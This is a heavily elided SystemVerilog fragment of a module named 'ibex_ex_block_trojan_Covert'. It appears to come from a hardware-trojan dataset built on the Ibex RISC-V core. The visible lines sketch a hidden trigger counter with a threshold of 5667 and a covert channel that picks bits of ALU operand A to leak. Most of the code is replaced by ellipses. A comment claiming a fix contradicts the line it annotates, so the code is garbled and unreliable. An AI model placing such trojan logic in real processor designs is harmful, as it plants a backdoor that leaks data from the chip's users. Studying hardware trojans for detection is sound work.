...
module ibex_ex_block_trojan_Covert #(
  ...
  output logic                  ex_valid_o             // EX has valid output
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 5667;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (alu_operand_a_i && |multdiv_ready_id_i) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = alu_operand_a_i[covert_bit_index];  // <-- FIXED: use trigger_signal
